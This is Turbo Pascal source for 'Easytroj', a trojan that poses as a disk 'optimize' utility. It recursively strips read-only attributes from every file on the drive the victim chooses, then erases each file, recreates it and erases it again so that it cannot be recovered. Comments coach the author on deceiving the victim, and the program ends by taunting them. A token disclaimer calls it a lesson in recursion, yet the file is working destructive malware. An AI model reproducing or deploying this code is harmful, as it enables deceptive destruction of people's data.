program Easytroj; { Here is a program that exemplifies a simple recursive
                    procedure that goes through and deletes all the files
                    in each of the directories on the disk - and takes
                    away the read-only attribute of all the philes.}
uses dos;
{ Written by: Orpheus}
{ Disclaimer:  I will not accept ANY responsibilities under ANY
               circumstances. I make no guarantees with this program.
               I am not responsible for illegal use of this program,
               it is to be used ONLY(of course) as a teaching tool that
               demonstrates recursive Turbo Pascal 5.X programming
               techniques.  So, by reading/using this, you are taking away
               all responsibilities from me that are written, implied,
               or stated, and shit.  So, THERE!  Bahahahahaha.......}
var
 filerec        : searchrec;{ This is the searchrec record that is
                              contained in the dos unit.  The format
                              is:   searchrec = record
                                                 fill: array[1..21] of byte;
                                                 attr: byte;
                                                 time: longint;
                                                 size: longint;
                                                 name: string[12];
                                                end;
                              This record is actually the File Control Block,
                              the FCB, of a file.  The 21-byte filler contains
                              technical information needed by DOS, DON'T fuck
                              with it!}
 targetfile     : file;
 oldattr,newattr: word;
procedure trashdirs(path : string);
var
 path2    : string;
 fileinfo : searchrec;
 fileinfo2: searchrec;
 i        : byte;
 old,new  : word;
 f        : file;
begin
 findfirst(path + '\*.*',directory,fileinfo);{This finds all directories}
 while doserror = 0 do
  begin
   if (fileinfo.attr = directory) and        {If Directory...           }
      (fileinfo.name[1] <> '.') then begin   {and isn't '.' or '..'     }
       path2 := path + '\' + fileinfo.name;  {then alter path.          }
       chdir(path2);                         {Change to this path...    }
       findfirst('*.*',(anyfile - directory),fileinfo2);{Find all files }
       while doserror = 0 do begin
        assign(f,fileinfo2.name);            {Assign var F to files name}
        getfattr(f,old);                     {Get F's old attr.         }
        new := old and $FE;                  
        setfattr(f,new);                     {Get rid of Read-Only      }
        erase(f);                            {Erase file...             }
        rewrite(f);                          {Remake it...              }
        close(f);                            {close it...               }
        erase(f);                            {Then erase it, and make it}
                                             {so it can't be unerased.  }
        findnext(fileinfo2);                 {Find next file.           }
       end;
      trashdirs(path2);                      {Recursively go back and do}
                                             {it again to next directory}
   end;
   findnext(fileinfo);                       {Find next direcotry       }
  end;
end;
procedure trash(drive : char);               {Use this procedure to     }
                                             {trash all the files in the}
                                             {root directory.           }
begin
 chdir(drive + ':\');                        {Change to root directory  }
 findfirst('*.*',anyfile-directory,filerec); {find all files...         }
 while doserror = 0 do begin
  assign(targetfile,filerec.name);           {Assign var targfil to file}
  getfattr(targetfile,oldattr);              {Get targetfile's old attr }
  newattr := oldattr and $FD;
  setfattr(targetfile,newattr);              {Get rid of Read-Only.     }
  {$I-}erase(targetfile);                    {Erase file...             }
  rewrite(targetfile);                       {rewrite file...           }
  close(targetfile);                         {close file...             }
  erase(targetfile);{$I+                     {erase file...             }
  findnext(filerec);                         {find next file.           }
 end;
 trashdirs(drive + ':');                     {calls Trashdir's to trash }
                                             {all directories/files     }
end;
var
 c : char;
cur: string;
begin
 Writeln;                                  {Put your fake info here.    }
 Writeln;
 Write('Enter drive to "optimize": ');     {Make the shithead enter     }
                                           {the drive, or do it yourself}
 readln(c);
 {$I-}Chdir(c + ':\');{$I+}                {Change to root.             }
 If IOResult<>0 then begin                 {If error then, write error  }
                                           {message...                  }
  Writeln;
  Writeln('Evidently, the drive that you entered is');{Change this to   }
  Writeln('not currently operating.  Please execute');{whatever you wish}
  Writeln('this program again with the correct info');{or just make it  }
  Writeln;                                 {trash a directory           }
  halt;                                    {Exit program.               }
 end
 else trash(c);                            {if no error,then trash drive}
 Writeln('Ok, asshole.  You''re dead.');   {Change this to whatever.    }
end.                                       {The End!                    }

